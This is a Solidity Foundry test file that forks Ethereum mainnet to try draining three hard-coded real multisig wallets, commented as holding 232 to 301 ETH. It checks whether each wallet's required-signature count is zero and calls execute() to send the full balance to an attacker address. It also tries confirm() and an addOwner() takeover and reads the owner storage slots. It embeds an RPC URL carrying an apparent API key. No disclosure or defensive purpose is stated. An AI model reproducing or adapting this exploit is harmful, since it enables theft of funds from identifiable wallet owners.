// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ZeroRequiredMultisigExploit is Test {
    // Working multisigs with m_required = 0 and huge daily limit
    address constant T1 = 0xbd6eD4969D9e52032eE3573e643f6a1bdC0a7E1E; // 301 ETH
    address constant T2 = 0x3885b0c18E3C4aB0CA2B8DC99771944404687628; // 250 ETH
    address constant T3 = 0x4615cC10092b514258577dAfcA98C142577f1578; // 232 ETH

    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
    }

    function test_exploitZeroRequired() public {
        console.log("=== ZERO REQUIRED MULTISIG EXPLOIT ===");

        address[3] memory targets = [T1, T2, T3];

        for (uint i = 0; i < 3; i++) {
            address target = targets[i];
            uint256 targetBal = target.balance;
            console.log("");
            console.log("Target:", target);
            console.log("Balance:", targetBal / 1e18, "ETH");

            // Check required
            (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("m_required()"));
            uint256 required = s ? abi.decode(d, (uint256)) : 999;
            console.log("Required signatures:", required);

            // Check daily limit
            (s, d) = target.staticcall(abi.encodeWithSignature("m_dailyLimit()"));
            uint256 dailyLimit = s ? abi.decode(d, (uint256)) : 0;
            console.log("Daily limit:", dailyLimit / 1e18, "ETH");

            if (required == 0) {
                console.log("!!! REQUIRED IS ZERO - ATTEMPTING EXECUTE !!!");

                uint256 attackerBefore = attacker.balance;

                // Try execute with 0 required - anyone might be able to execute!
                vm.prank(attacker);
                (s,) = target.call(
                    abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, targetBal, "")
                );
                console.log("Execute call success:", s);

                uint256 attackerAfter = attacker.balance;
                if (attackerAfter > attackerBefore) {
                    console.log("!!! DRAINED:", (attackerAfter - attackerBefore) / 1e18, "ETH !!!");
                } else {
                    console.log("No ETH received");

                    // Try the old Parity execute which uses confirm() internally
                    vm.prank(attacker);
                    target.call(abi.encodeWithSignature("confirm(bytes32)", keccak256(abi.encodePacked(target, attacker, targetBal, ""))));
                }
            }
        }

        console.log("");
        console.log("Final attacker balance:", attacker.balance / 1e18, "ETH");
    }

    function test_underDailyLimit() public {
        console.log("=== TESTING UNDER DAILY LIMIT ===");

        address target = T1;
        console.log("Target:", target);
        console.log("Balance:", target.balance / 1e18, "ETH");

        // Check spent today
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("m_spentToday()"));
        uint256 spentToday = s ? abi.decode(d, (uint256)) : 0;
        console.log("Spent today:", spentToday / 1e18, "ETH");

        // Try small amount under any reasonable limit
        uint256 smallAmount = 0.001 ether;
        uint256 attackerBefore = attacker.balance;

        vm.prank(attacker);
        (s,) = target.call{gas: 500000}(
            abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, smallAmount, "")
        );
        console.log("Execute 0.001 ETH success:", s);

        if (attacker.balance > attackerBefore) {
            console.log("!!! GOT:", (attacker.balance - attackerBefore), "wei !!!");
        }
    }

    function test_directCall() public {
        console.log("=== DIRECT CALL TEST ===");

        // The implementation allows execute if:
        // 1. Sender is owner OR
        // 2. Required confirmations met OR
        // 3. Under daily limit AND no confirmations needed

        address target = T1;

        // Check if we can be added as owner somehow
        vm.prank(attacker);
        (bool s,) = target.call(abi.encodeWithSignature("addOwner(address)", attacker));
        console.log("addOwner call:", s);

        // Check if we're owner now
        bytes memory d2;
        (s, d2) = target.staticcall(abi.encodeWithSignature("isOwner(address)", attacker));
        bool isOwner = s && abi.decode(d2, (bool));
        console.log("Attacker is owner:", isOwner);

        if (isOwner) {
            // We're owner, try execute
            vm.prank(attacker);
            uint256 before = attacker.balance;
            target.call(abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, target.balance, ""));
            console.log("Drained:", (attacker.balance - before) / 1e18, "ETH");
        }
    }

    function test_checkOwnerStorage() public view {
        console.log("=== OWNER STORAGE ANALYSIS ===");

        address target = T1;

        // The Parity wallet stores owners in slots starting at position 2+256
        // ownerIndex mapping at 0x100, owners array at 0x200

        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(target, bytes32(uint256(0x100) + i));
            if (slot != bytes32(0)) {
                console.log("Slot 0x100 +", i);
                console.logBytes32(slot);
            }
        }

        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(target, bytes32(uint256(0x200) + i));
            if (slot != bytes32(0)) {
                console.log("Slot 0x200 +", i);
                console.logBytes32(slot);
            }
        }
    }
}
